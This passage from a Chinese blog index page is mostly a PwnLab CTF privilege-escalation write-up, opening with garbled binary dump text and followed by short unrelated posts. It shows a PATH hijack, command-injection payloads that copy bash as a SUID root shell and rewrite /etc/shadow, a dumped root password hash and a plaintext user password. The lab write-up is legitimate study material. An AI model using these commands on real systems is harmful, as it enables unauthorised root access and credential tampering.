h锟絈Vh[锟斤拷锟斤拷锟斤拷f锟絝锟絝锟絝锟絝锟絝锟絝锟斤拷$锟絝锟絝锟絝锟絝锟絝锟絝锟斤拷c-`锟斤拷v鈻掞拷锟斤拷tU锟斤拷锟斤拷h`锟叫冿拷锟斤拷脨锟絫&amp;锟絗-`锟斤拷锟斤拷锟斤拷锟斤拷锟絫锟斤拷tU锟斤拷锟斤拷Ph`锟揭冿拷锟斤拷脥t&amp;锟斤拷&#x27;锟�=`uU锟斤拷锟斤拷|锟斤拷锟斤拷`锟斤拷锟絝锟斤拷H锟斤拷锟絬霌峷锟斤拷锟絫锟経锟斤拷锟斤拷P锟揭冿拷锟斤拷u锟斤拷锟斤拷L$锟斤拷锟斤拷q锟経锟斤拷Q锟斤拷锟絟锟絟锟斤拷锟斤拷锟斤拷锟斤拷锟絟锟絟锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷</span><br><span class="line">                                                                                    h@锟絤锟斤拷锟斤拷锟斤拷M锟缴峚锟斤拷f锟経W1锟絍S锟斤拷锟斤拷锟斤拷锟絵锟斤拷锟絣$0锟斤拷</span><br><span class="line">锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟絊锟斤拷c锟斤拷锟斤拷锟�                                                                                                    锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟�)锟斤拷锟斤拷锟絫&#x27;锟斤拷锟紻$8锟�,$锟紻锟紻$4锟紻$锟斤拷锟斤拷锟斤拷锟�9锟絬邇锟絒^_]锟斤拷</span><br><span class="line">                        锟絒锟絚at /home/mike/msg.txt(锟斤拷锟斤拷D锟斤拷锟絟X锟斤拷锟斤拷锟斤拷锟斤拷锟絲R|</span><br><span class="line">                                                                        \锟斤拷锟紽</span><br><span class="line">                                                                             J</span><br><span class="line">                                                                              tx?鈻�;*2$&quot;(@锟斤拷锟斤拷SD</span><br><span class="line">                                                                                               GuCu|@</span><br><span class="line">                                                                                                     A锟紺</span><br><span class="line">                                                                                                        8l锟斤拷锟斤拷a锟紸</span><br><span class="line">                                                                                                                 锟紺锟紸锟絅0HA锟紸锟�</span><br><span class="line">                                                                                                                             AA锟斤拷锟斤拷锟斤拷0锟�</span><br><span class="line">$@鈻扗锟斤拷锟給锟斤拷锟�                                                                                                                           </span><br><span class="line">^</span><br><span class="line"> 8(锟斤拷锟給锟斤拷锟斤拷o锟斤拷锟給zL&amp;6FVGCC: (Debian 4.9.2-10) 4.9.2GCC: (Debian 4.8.4-1) 4.8.4.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.got.plt.data.bss.comment4Hh锟斤拷z锟斤拷    锟斤拷</span><br><span class="line"> </span><br><span class="line">锟�</span><br><span class="line">$8X锟紷DHL48X鈻抈鈻掞拷锟�</span><br><span class="line">(&lt; P`鈻抃 v锟絏鈻掞拷锟� 锟絓鈻掞拷&lt;锟斤拷锟斤拷a 锟�</span><br><span class="line">        crtstuff.c__JCR_LIST__deregister_tm_clonesregister_tm_clones__do_global_dtors_auxcompleted.6279__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrymsgmike.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable__x86.get_pc_thunk.bxdata_start_edata_fini__data_startsystem@@GLIBC_2.0__gmon_start____dso_handle_IO_stdin_usedsetreuid@@GLIBC_2.0__libc_start_main@@GLIBC_2.0__libc_csu_init_end_start_fp_hw__bss_startmainsetregid@@GLIBC_2.0_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTable_init4#HH 1hh$D锟斤拷锟給锟斤拷 N</span><br><span class="line">               锟斤拷pV^^锟斤拷锟給zzk锟斤拷锟給锟斤拷 z    锟斤拷      B锟斤拷(</span><br><span class="line">                                                   锟�#锟絗锟絗`锟斤拷$$锟�88锟絏X,锟斤拷锟斤拷锟紷@锟紻D锟紿H锟絃L锟�44锟�88 锟絏``锟�0`9锟絇- 锟�</span><br><span class="line">                                                                                                         |</span><br></pre></td></tr></table></figure>有一句<strong>cat /home/mike/msg.txt</strong> 应该就是其所封装的命令<p></p><p>属主是mike</p><p>在history中有这么一句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=./:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>那么,我们也构造一句<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/home/kane:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kane@pwnlab:~$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/home/kane:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br></pre></td></tr></table></figure><p>查看PATH中第一个目录的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kane@pwnlab:/usr/local$ <span class="built_in">ls</span> -lad bin</span><br><span class="line"><span class="built_in">ls</span> -lad bin</span><br><span class="line">drwxrwsr-x 2 root staff 4096 Mar 17  2016 bin</span><br></pre></td></tr></table></figure><p>修改当前目录下的cat文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kane@pwnlab:~$ <span class="built_in">echo</span> <span class="string">&quot;/bin/bash;ls &quot;</span> &gt; <span class="built_in">cat</span></span><br></pre></td></tr></table></figure>再次运行<strong>./msgmike</strong><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kane@pwnlab:~$ ./msgmike</span><br><span class="line">./msgmike</span><br><span class="line">mike@pwnlab:~$</span><br></pre></td></tr></table></figure><p>现在是属主为root用户的suid文件,和上述套路一致</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 2 mike mike 4096 Mar 17  2016 .</span><br><span class="line">drwxr-xr-x 6 root root 4096 Mar 17  2016 ..</span><br><span class="line">-rw-r--r-- 1 mike mike  220 Mar 17  2016 .bash_logout</span><br><span class="line">-rw-r--r-- 1 mike mike 3515 Mar 17  2016 .bashrc</span><br><span class="line">-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root</span><br><span class="line">-rw-r--r-- 1 mike mike  675 Mar 17  2016 .profile</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>执行一遍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ ./msg2root</span><br><span class="line">./msg2root                                                                                                                                                                                                </span><br><span class="line">Message <span class="keyword">for</span> root: flag&#123;T5566Y&#125;                                                                                                                                                                            </span><br><span class="line">flag&#123;T5566Y&#125;                                                                                                                                                                                              </span><br><span class="line">flag&#123;T5566Y&#125; </span><br></pre></td></tr></table></figure><p>复制到tmp目录下,蚁剑查看内容</p><p>猜测代码为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/echo %s &gt;&gt; /root/messages.txt</span><br></pre></td></tr></table></figure><p></p><p>猜测源代码为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">// printf(&quot;helloworld\n&quot;);</span></span><br><span class="line">	<span class="type">char</span> a[];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;a);</span><br><span class="line">	<span class="comment">// printf(a);</span></span><br><span class="line">	<span class="type">char</span> s[<span class="number">500</span>];</span><br><span class="line">	<span class="built_in">sprintf</span>(s,<span class="string">&quot;/bin/echo %s &gt;&gt; /root/messages.txt&quot;</span>,a);</span><br><span class="line">	<span class="comment">// system(&quot;/bin/echo %s &gt;&gt; /root/messages.txt&quot;,a);</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s);</span><br><span class="line">	system(s);</span><br><span class="line">	<span class="comment">// printf(&quot;%s\n&quot;,a );</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a;sed -i <span class="string">&#x27;s@^root.*@root:$6$k/mtF8Ic$.whWyn0EQI4q3rucHh3iYK.E6gTmbG3l1KoaQpnFrvs.bD2gw.JCvip1Jt4As5Vz7XKvgWAOz0L/iwaM2aDwp/:18042:0:99999:7:::@g$&#x27;</span> /etc/shadow;<span class="built_in">echo</span> 0</span><br><span class="line"></span><br><span class="line">/bin/echo <span class="string">&quot;&quot;</span>;sed <span class="string">&quot;s@^root.*@root:$6<span class="variable">$k</span>/mtF8Ic$.whWyn0EQI4q3rucHh3iYK.E6gTmbG3l1KoaQpnFrvs.bD2gw.JCvip1Jt4As5Vz7XKvgWAOz0L/iwaM2aDwp/:18042:0:99999:7:::@g&quot;</span> /etc/shadow;<span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt;&gt; /root/messages.txt</span><br><span class="line">a;a=\&quot;;<span class="built_in">echo</span> <span class="variable">$a</span>;<span class="built_in">echo</span> a</span><br></pre></td></tr></table></figure><p>sed 可以看出来是直接返回我输入的内容 但是如果我输入的是带反引号的语句呢?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`/bin/bash`</span><br></pre></td></tr></table></figure><p></p><p>上面的实践无效</p><p>不行,深夜,我想到还是用普通的语句的老老实实的换吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ ./msg2root</span><br><span class="line">./msg2root</span><br><span class="line">Message <span class="keyword">for</span> root: <span class="string">&quot;&quot;</span>;grep <span class="string">&quot;root&quot;</span> /etc/shadow;<span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;</span>;grep <span class="string">&quot;root&quot;</span> /etc/shadow;<span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">root:$6$aYZMZ3V0<span class="variable">$qAYwiR7aanVmKSWyV5IbRffspdjFx4xhLrm8kbHhh1DG16Bdb0</span>/ptImcDK2uT.6xc/FZotacYr0X4dB0SurjD/:16877:0:99999:7:::</span><br><span class="line"></span><br><span class="line"><span class="comment"># root:$6$k/mtF8Ic$.whWyn0EQI4q3rucHh3iYK.E6gTmbG3l1KoaQpnFrvs.bD2gw.JCvip1Jt4As5Vz7XKvgWAOz0L/iwaM2aDwp/:16877:0:99999:7:::</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mike@pwnlab:/home/mike$ ./msg2root</span><br><span class="line">./msg2root</span><br><span class="line">Message <span class="keyword">for</span> root: <span class="string">&quot;&quot;</span>;<span class="built_in">cp</span> /bin/bash /home/kane/sh;<span class="built_in">chmod</span> +s /home/kane/sh;<span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;</span>;<span class="built_in">cp</span> /bin/bash /home/kane/sh;<span class="built_in">chmod</span> +s /home/kane/sh;<span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mike@pwnlab:/home/mike$ <span class="built_in">cd</span> </span><br><span class="line"><span class="built_in">cd</span> </span><br><span class="line">mike@pwnlab:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span>  flag_wrong.txt  msgmike  sh  tq</span><br><span class="line">mike@pwnlab:~$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 1160</span><br><span class="line">drwxr-x--- 2 kane kane    4096 May 26 17:47 .</span><br><span class="line">drwxr-xr-x 6 root root    4096 Mar 17  2016 ..</span><br><span class="line">-rw------- 1 kane kane    1245 May 26 10:36 .bash_history</span><br><span class="line">-rw-r--r-- 1 kane kane     220 Mar 17  2016 .bash_logout</span><br><span class="line">-rw-r--r-- 1 kane kane    3515 Mar 17  2016 .bashrc</span><br><span class="line">-rwxrwxrwx 1 kane kane      14 May 26 17:01 <span class="built_in">cat</span></span><br><span class="line">-rw-r--r-- 1 root root      13 Apr 25 10:32 flag_wrong.txt</span><br><span class="line">-rwsr-sr-x 1 mike mike    5148 Mar 17  2016 msgmike</span><br><span class="line">-rw-r--r-- 1 kane kane     675 Mar 17  2016 .profile</span><br><span class="line">-rwsr-sr-x 1 root root 1105840 May 26 17:47 sh</span><br><span class="line">-rwsr-sr-x 1 root root   38868 May 26 17:42 tq</span><br><span class="line">mike@pwnlab:~$ sh</span><br><span class="line">sh</span><br><span class="line">sh-4.3<span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">sh-4.3<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>引用一下几个文件/etc/bash.bashrc /etc/profile /root/.profile /root/.bashrc 然后用vi强行修改/etc/shadow文件,登陆成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@pwnlab:/home/kane# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@pwnlab:~<span class="comment"># cat flag.txt</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line">.-=~=-.                                                                 .-=~=-.</span><br><span class="line">(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)</span><br><span class="line">(_ ___)  _____                             _                            (_ ___)</span><br><span class="line">(__  _) /  __ \                           | |                           (__  _)</span><br><span class="line">( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)</span><br><span class="line">(__  _) | |    / _ \| <span class="string">&#x27;_ \ / _` | &#x27;</span>__/ _` | __/ __|                     (__  _)</span><br><span class="line">(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)</span><br><span class="line">(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)</span><br><span class="line">( _ __)                     __/ |                                       ( _ __)</span><br><span class="line">(__  _)                    |___/                                        (__  _)</span><br><span class="line">(__  _)                                                                 (__  _)</span><br><span class="line">(_ ___) If  you are  reading this,  means  that you have  <span class="built_in">break</span> <span class="string">&#x27;init&#x27;</span>  (_ ___)</span><br><span class="line">( _ __) Pwnlab.  I hope  you enjoyed  and thanks  <span class="keyword">for</span>  your time doing  ( _ __)</span><br><span class="line">(__  _) this challenge.                                                 (__  _)</span><br><span class="line">(_ ___)                                                                 (_ ___)</span><br><span class="line">( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)</span><br><span class="line">(__  _) reading it                                                      (__  _)</span><br><span class="line">(__  _)                                                                 (__  _)</span><br><span class="line">(__  _)                                             For sniferl4bs.com  (__  _)</span><br><span class="line">( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)</span><br><span class="line">(__  _)                                                                 (__  _)</span><br><span class="line">(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)</span><br><span class="line">`-._.-<span class="string">&#x27;                                                                 `-._.-&#x27;</span></span><br><span class="line">root@pwnlab:~<span class="comment"># </span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/rbash&#x27;)&quot;</span><br><span class="line">su kane -c &quot;iSv5Ym2GRo&quot;</span><br><span class="line">cd /home/kane</span><br><span class="line">export PATH=/home/kane:$PATH</span><br><span class="line">echo &quot;/bin/bash;ls &quot; &gt; cat</span><br><span class="line">./msgmike</span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.divint3.cn/Linux-%E6%96%87%E4%BB%B6%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BE%93%E5%87%BA/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/head.png"><meta itemprop="name" content="Divint3"><meta itemprop="description" content="おかわいいこと"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="HexBlog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/Linux-%E6%96%87%E4%BB%B6%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%BE%93%E5%87%BA/" class="post-title-link" itemprop="url">Linux-文件转二进制输出</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-05-23 19:54:20" itemprop="dateCreated datePublished" datetime="2019-05-23T19:54:20+08:00">2019-05-23</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-06-08 18:41:32" itemprop="dateModified" datetime="2020-06-08T18:41:32+08:00">2020-06-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/linux%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index"><span itemprop="name">linux技术</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -b ctf_chache/ZipCenOp.jar | <span class="built_in">cut</span> -d <span class="string">&quot; &quot;</span> -f2-7 | sed -e <span class="string">&#x27;s/ //g&#x27;</span> -e <span class="string">&#x27;:a;N;$!ba;s/\n//g&#x27;</span> | sed <span class="string">&#x27;s/ //g&#x27;</span></span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.divint3.cn/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E8%AE%BE%E8%AE%A1/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/head.png"><meta itemprop="name" content="Divint3"><meta itemprop="description" content="おかわいいこと"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="HexBlog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E8%AE%BE%E8%AE%A1/" class="post-title-link" itemprop="url">数据库表设计</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-05-19 11:05:28" itemprop="dateCreated datePublished" datetime="2019-05-19T11:05:28+08:00">2019-05-19</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-06-08 18:41:32" itemprop="dateModified" datetime="2020-06-08T18:41:32+08:00">2020-06-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">编程</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><h3 id="无限分类">无限分类</h3><p>无限分类类似于磁盘中linux的文件查找机制 表的设计可以简化为 id-&gt;就是id啊 pid-&gt;父级id</p><p>高级一点,也方便查找的数据表结构可以新增一个字段 path-&gt;递归记录父类id,包括祖id</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//这是一个控制器,用来接收post参数</span></span><br><span class="line">	<span class="variable">$name</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">	<span class="variable">$pid</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pid&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pid</span>))&#123;</span><br><span class="line">		<span class="keyword">do</span>&#123;</span><br><span class="line">			<span class="variable">$pid</span>=<span class="title function_ invoke__">db</span>(goods)-&gt;<span class="title function_ invoke__">limit</span>([<span class="string">&#x27;pid&#x27;</span>=&gt;<span class="variable">$pid</span>])-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">			<span class="variable">$path</span>=<span class="variable">$pid</span>.<span class="variable">$path</span>;</span><br><span class="line">		&#125;<span class="keyword">while</span>(<span class="variable">$pid</span>!=<span class="number">0</span>);</span><br><span class="line">		<span class="variable">$id</span>=<span class="title function_ invoke__">db</span>(goods)-&gt;<span class="title function_ invoke__">save</span>([<span class="string">&#x27;name&#x27;</span>=&gt;<span class="variable">$name</span>,<span class="string">&#x27;pid&#x27;</span>=&gt;<span class="variable">$pid</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="variable">$path</span>]); </span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$id</span>=<span class="title function_ invoke__">db</span>(goods)-&gt;<span class="title function_ invoke__">save</span>([<span class="string">&#x27;name&#x27;</span>=&gt;<span class="variable">$name</span>,<span class="string">&#x27;pid&#x27;</span>=&gt;<span class="number">0</span>]);<span class="comment">//需要设定$path默认为零,也就是说,如果没有传入path,他就是一个根分类</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>(<span class="variable">$id</span>);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.divint3.cn/solarized-vim%E7%BE%8E%E5%8C%96/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/head.png"><meta itemprop="name" content="Divint3"><meta itemprop="description" content="おかわいいこと"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="HexBlog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/solarized-vim%E7%BE%8E%E5%8C%96/" class="post-title-link" itemprop="url">solarized-vim美化</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-05-15 23:12:35" itemprop="dateCreated datePublished" datetime="2019-05-15T23:12:35+08:00">2019-05-15</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-06-08 18:41:32" itemprop="dateModified" datetime="2020-06-08T18:41:32+08:00">2020-06-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/linux%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">linux工具</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><h3 id="vimrc">.vimrc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">syntax enable</span><br><span class="line">set t_Co=256</span><br><span class="line">set background=dark</span><br><span class="line">let g:solarized_termtrans = 1   #这一条存在的原因是,xwindows情境下,由于透明度等因素,会使vim页面变得灰白,加上这一条命令即可</span><br><span class="line">colorscheme solarized</span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.divint3.cn/akonadi-%E6%8F%90%E7%A4%BA%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/head.png"><meta itemprop="name" content="Divint3"><meta itemprop="description" content="おかわいいこと"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="HexBlog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/akonadi-%E6%8F%90%E7%A4%BA%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-title-link" itemprop="url">akonadi-提示无法连接数据库</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-05-15 23:06:08" itemprop="dateCreated datePublished" datetime="2019-05-15T23:06:08+08:00">2019-05-15</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-06-08 18:41:32" itemprop="dateModified" datetime="2020-06-08T18:41:32+08:00">2020-06-08</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far 